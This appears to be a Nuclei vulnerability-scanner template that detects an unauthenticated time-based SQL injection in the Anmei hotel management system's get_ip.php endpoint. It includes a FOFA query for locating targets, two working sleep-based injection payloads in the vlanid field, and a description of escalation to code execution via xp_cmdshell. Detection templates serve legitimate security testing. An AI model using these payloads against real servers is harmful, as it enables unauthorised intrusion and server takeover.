id: anmeijiudian-get_ip-sql-time

info:
  name: "安美酒店管理系统 get_ip 接口 SQL 注入漏洞"
  author: Unknown
  severity: high
  description: |-
    fofa: title="酒店宽带运营系统"
      安美酒店管理系统/get_ip接口存在SQL注入漏洞，攻击者可利用该漏洞执行任意SQL语句，通过调用xpcmdshell扩展存储过程实现后门文件写入及任意代码执行，最终控制目标服务器。该漏洞允许未经身份验证的远程攻击者通过构造恶意请求实现服务器权限获取。
  reference:
  - https://mp.weixin.qq.com/s/gJsvZUhP9Xyf1eoNcqASuA
  tags: 安美酒店管理系统


http:
- raw:
  - |
    POST /user/get_ip.php HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36
    Content-Type: application/x-www-form-urlencoded

    lang=GB&gwip=1&realip=1&vlanid=1'XOR(if(now()=sysdate()%2Csleep(4)%2C0))XOR'Z
  - |
    POST /user/get_ip.php HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36
    Content-Type: application/x-www-form-urlencoded

    lang=GB&gwip=1&realip=1&vlanid=1'XOR(if(now()=sysdate()%2Csleep(8)%2C0))XOR'Z
  matchers:
  - type: dsl
    dsl:
    - 'duration_1>=4 && duration_1<=5'
    - 'duration_2>=8 && duration_2<=9'
    condition: and
